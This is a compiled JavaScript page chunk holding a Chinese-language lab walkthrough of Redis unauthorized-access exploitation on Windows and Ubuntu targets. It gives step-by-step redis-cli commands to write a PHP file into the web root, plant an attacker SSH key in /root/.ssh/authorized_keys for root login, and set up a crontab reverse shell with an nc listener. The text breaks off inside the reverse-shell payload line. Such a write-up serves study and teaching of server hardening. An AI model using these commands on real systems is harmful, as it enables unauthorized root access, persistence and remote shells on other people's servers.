(window.webpackJsonp=window.webpackJsonp||[]).push([[132],{495:function(s,a,e){"use strict";e.r(a);var t=e(11),n=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("p",[s._v("redis数据库的写操作可以做什么")]),s._v(" "),a("h2",{attrs:{id:"漏洞原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞原理"}},[s._v("#")]),s._v(" 漏洞原理")]),s._v(" "),a("p",[s._v("利用条件：")]),s._v(" "),a("ul",[a("li",[s._v("版本：Redis 3.2前")]),s._v(" "),a("li",[s._v("默认端口：6379")]),s._v(" "),a("li",[s._v("默认密码：无")]),s._v(" "),a("li",[s._v("IP：0.0.0.0 （任意用户）")])]),s._v(" "),a("p",[s._v("Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。Redis像mysql一样，可以向文件里写入内容，例如webshell。")]),s._v(" "),a("p",[s._v("在Redis 3.2以后引入了安全配置项"),a("strong",[s._v("protected-mode，默认只允许本地访问且需要密码验证")]),s._v("，3.2以后版本需要手动更改配置复现该漏洞")]),s._v(" "),a("p",[s._v("新版本redis可能要ssrf来利用了")]),s._v(" "),a("p",[s._v("一些利用姿势：")]),s._v(" "),a("ul",[a("li",[s._v("写入webshell")]),s._v(" "),a("li",[s._v("在"),a("strong",[s._v("crontab")]),s._v("里写定时任务反弹shell")]),s._v(" "),a("li",[s._v("写入ssh密钥，直接登录服务器")])]),s._v(" "),a("div",{staticClass:"custom-block danger"},[a("p",{staticClass:"custom-block-title"},[s._v("警告")]),s._v(" "),a("p",[s._v("在linux环境下，如果以root身份运行Redis，只要能够通过Redis未授权访问控制漏洞写入一份ssh公钥，可以直接实现root权限登录")])]),s._v(" "),a("h2",{attrs:{id:"windows环境复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#windows环境复现"}},[s._v("#")]),s._v(" windows环境复现")]),s._v(" "),a("p",[s._v("靶机：")]),s._v(" "),a("ul",[a("li",[s._v("os：windows 10")]),s._v(" "),a("li",[s._v("redis：3.0.504")]),s._v(" "),a("li",[s._v("IP：192.168.237.136")])]),s._v(" "),a("p",[s._v("攻击机：")]),s._v(" "),a("ul",[a("li",[s._v("os：windows 10")]),s._v(" "),a("li",[s._v("IP：192.168.237.1")])]),s._v(" "),a("p",[s._v("补充：在靶机里使用的"),a("strong",[s._v("phpstudy")]),s._v("搭建的web环境，以及phpstudy自带的redis，phpstudy为了安全，默认给redis设置了仅本地可访问，改成0.0.0.0")]),s._v(" "),a("p",[s._v("关于连接redis，我主机(攻击机)里使用的也是phpstudy，也下载一个redis，里面有redis-cli.exe，可以连接靶机redis，可以用kali作为攻击机，自带redis客户端连接工具"),a("s",[s._v("以子之矛，攻子之盾，则何如")])]),s._v(" "),a("p",[s._v("使用redis数据库连接工具也可以")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/1.png",alt:"1"}})]),s._v(" "),a("p",[s._v("最后，redis别忘启动")]),s._v(" "),a("h3",{attrs:{id:"准备"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#准备"}},[s._v("#")]),s._v(" 准备")]),s._v(" "),a("p",[s._v("phpstudy自带的redis，phpstudy为了安全，默认给redis设置了仅本地可访问，改成0.0.0.0")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/2.png",alt:"2"}})]),s._v(" "),a("p",[s._v("攻击机phpstudy安装redis，进入redis目录，存在redis-cli.exe")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/3.png",alt:"3"}})]),s._v(" "),a("h3",{attrs:{id:"写入webshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写入webshell"}},[s._v("#")]),s._v(" 写入webshell")]),s._v(" "),a("p",[s._v("在redis安装目录打开终端")]),s._v(" "),a("p",[s._v("用法： "),a("code",[s._v("./redis-cli.exe -h ip -p port")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./redis-cli.exe "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.136 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("使用"),a("code",[s._v("info")]),s._v("命令获取系统信息")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("info\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/4.png",alt:"4"}})]),s._v(" "),a("p",[s._v("有了。如果知道web路径，可以写入webshell，可以通过"),a("code",[s._v("phpinfo()")]),s._v("获取web路径，不知道web路径哪里提前写入了"),a("strong",[s._v("phpinfo()")]),s._v("？你存心找茬是不是，我写webshell的能给你假路径？")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/5.png",alt:"5"}})]),s._v(" "),a("p",[s._v("写入webshell")]),s._v(" "),a("p",[s._v("补充一些redis指令（不区分大小写）：")]),s._v(" "),a("p",[a("strong",[s._v("CONFIG SET")]),s._v(" 是 "),a("strong",[s._v("Redis")]),s._v(" 的配置命令，用于动态修改 Redis 服务器的运行时配置，而"),a("strong",[s._v("无需重新启动服务器")])]),s._v(" "),a("p",[s._v("语法："),a("code",[s._v("CONFIG SET <配置项> <值>")])]),s._v(" "),a("p",[s._v("常用配置项：")]),s._v(" "),a("ul",[a("li",[s._v("dir ：设置 Redis 保存数据文件的目录")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("CONFIG SET "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/path/to/directory/"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("ul",[a("li",[s._v("dbfilename ： 设置 Redis 保存数据时的文件名")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("CONFIG SET dbfilename "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1.php"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("SET")]),s._v("：设置键值对，将用户提供的值与指定的键绑定，保存到 Redis 数据库中")]),s._v(" "),a("p",[s._v("语法："),a("code",[s._v("SET <key> <value>")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" shell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"<?php phpinfo();?>"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("SAVE")]),s._v("：将当前内存中的数据保存到指定的文件中")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("save\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("前面"),a("strong",[s._v("phpinfo")]),s._v("获取web路径"),a("code",[s._v("c:/phpstudy/phpstudy_pro/WWW/")]),s._v("，开搞")]),s._v(" "),a("p",[s._v("后面的端口参数可以省略的如果是默认的6379")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./redis-cli.exe "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.136 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"c:/phpstudy/phpstudy_pro/WWW/"')]),s._v("\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1.php"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" shell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"<?php phpinfo();?>"')]),s._v("\nsave\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("成功写入webshell，有点脏数据，不影响")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/6.png",alt:"6"}})]),s._v(" "),a("h2",{attrs:{id:"linux环境复现准备"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#linux环境复现准备"}},[s._v("#")]),s._v(" linux环境复现准备")]),s._v(" "),a("p",[s._v("上面说了，新版本redis需要手动更改配置复现该漏洞，可以选老版本自己编译")]),s._v(" "),a("p",[s._v("redis发布版下载地址：https://download.redis.io/releases/")]),s._v(" "),a("p",[s._v("靶机环境准备：")]),s._v(" "),a("ul",[a("li",[s._v("os：ubuntu 22.04 server")]),s._v(" "),a("li",[s._v("redis 3.0.0")])]),s._v(" "),a("p",[s._v("编译环境")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("apt")]),s._v(" update\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("apt")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v(" build-essential tcl\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("下载源码")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" http://download.redis.io/releases/redis-3.0.0.tar.gz\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("tar")]),s._v(" xzf redis-3.0.0.tar.gz\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" redis-3.0.0\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("编译，编译过程报错不要怕，是warning(x)")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("make")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("不放心可以测试下")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("make")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("test")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/7.png",alt:"7"}})]),s._v(" "),a("p",[s._v("到src目录下安装")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" src\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("make")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" /usr/local/bin/redis-server\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" /usr/local/bin/redis-cli\nredis-server "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--version")]),s._v("\nredis-cli "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--version")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("查看版本，返回版本信息就是成功安装")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/8.png",alt:"8"}})]),s._v(" "),a("h2",{attrs:{id:"linux环境复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#linux环境复现"}},[s._v("#")]),s._v(" linux环境复现")]),s._v(" "),a("ul",[a("li",[s._v("写入webshell")]),s._v(" "),a("li",[s._v("定时任务反弹shell")]),s._v(" "),a("li",[s._v("写入ssh密钥登录服务器")])]),s._v(" "),a("p",[s._v("web目录需要有写的权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("777")]),s._v(" /var/www/html\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("ssh密钥登录root需要root用户启动redis，听起来有点幽默，复现这三个姿势那就直接root启动了")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" redis-server\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/9.png",alt:"9"}})]),s._v(" "),a("p",[s._v("靶机：")]),s._v(" "),a("ul",[a("li",[s._v("os：ubuntu 22.04 server")]),s._v(" "),a("li",[s._v("redis 3.0.0")]),s._v(" "),a("li",[s._v("IP：192.168.237.140")])]),s._v(" "),a("p",[s._v("攻击机：")]),s._v(" "),a("ul",[a("li",[s._v("os：windows 10 ，")]),s._v(" "),a("li",[s._v("IP：192.168.237.128")])]),s._v(" "),a("p",[a("strong",[s._v("建议选择kali，在kali比较舒服，选择win10比较折腾了，束手束脚")])]),s._v(" "),a("h3",{attrs:{id:"写入webshell-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写入webshell-2"}},[s._v("#")]),s._v(" 写入webshell")]),s._v(" "),a("p",[a("strong",[s._v("建议选择kali操作")])]),s._v(" "),a("p",[s._v("连接redis，使用config set,set,save等命令写入就可以了")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("redis-cli "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.140 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /var/www/html\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".php\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" shell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"<?php phpinfo();?>"')]),s._v("\nsave\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/10.png",alt:"10"}})]),s._v(" "),a("h3",{attrs:{id:"写入ssh公钥"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写入ssh公钥"}},[s._v("#")]),s._v(" 写入ssh公钥")]),s._v(" "),a("p",[s._v("原理就是在数据库中插入一条数据，将本机的公钥作为value，(key值随意)，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生一个授权的key")]),s._v(" "),a("p",[s._v("生成一对key，全选默认即可:")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("ssh-keygen "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-t")]),s._v(" rsa\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/14.png",alt:"14"}})]),s._v(" "),a("p",[s._v("去ssh生成的目录下，将公钥导入key.txt文件（前后用\\n\\n换行，避免和Redis里其他缓存数据混合）")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" /home/ajay/.ssh/\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("echo "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" id_rsa.pub"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" key.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("把key.txt文件内容写入目标主机的缓冲里")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" key.txt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" redis-cli "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.140 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-x")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" sshpub\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("连接目标主机的Redis，设置redis的备份路径为/root/.ssh和保存文件名authorized_keys")]),s._v(" "),a("p",[s._v("注意删除缓存里无关的键值对，避免写入公钥里影响登录")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("redis-cli "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.140 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /root/.ssh\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename authorized_keys\nkeys *\ndel shell\nget sshpub\nsave\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/15.png",alt:"15"}})]),s._v(" "),a("p",[s._v("ssh登录")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" root@192.168.237.140\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("成功免密登录，查看下密钥，感觉有点怪怪的，为什么可以？")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/16.png",alt:"16"}})]),s._v(" "),a("h3",{attrs:{id:"反弹shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反弹shell"}},[s._v("#")]),s._v(" 反弹shell")]),s._v(" "),a("p",[s._v("定时任务路径")]),s._v(" "),a("ul",[a("li",[s._v("linux通用：/etc/crontab")]),s._v(" "),a("li",[s._v("ubuntu：/var/spool/cron/crontabs/当前用户")]),s._v(" "),a("li",[s._v("centos：/var/spool/cron/当前用户")])]),s._v(" "),a("p",[s._v("通过定时任务crontab里写入新任务，反弹shell\n原理是和写webshell、公钥一样的，只是变换一下写入的内容和路径，数据库名")]),s._v(" "),a("div",{staticClass:"custom-block danger"},[a("p",{staticClass:"custom-block-title"},[s._v("警告")]),s._v(" "),a("p",[s._v("写入定时任务注意查看当前redis有哪些键值对，避免把其他无关键值对写进去影响定时任务格式导致无法执行")])]),s._v(" "),a("p",[s._v("避免影响，都删了")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("keys *\ndel 键名\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/11.png",alt:"11"}})]),s._v(" "),a("p",[s._v("现在可以写定时任务反弹shell了")]),s._v(" "),a("p",[s._v("开个终端监听反弹的shell")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvnp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("开个终端写入反弹shell定时任务")]),s._v(" "),a("div",{staticClass:"custom-block danger"},[a("p",{staticClass:"custom-block-title"},[s._v("警告")]),s._v(" "),a("p",[s._v("如果使用的centos，这里你可能会执行成功，反弹shell。如果是ubuntu，过程比较曲折，中间大部分是补充内容，且最后也没有利用成功，为什么有师傅ubuntu能成功？可恶，难道这就是这副身躯的极限了吗？")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./redis-cli "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.140 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 每分钟反弹一次")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" shell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token 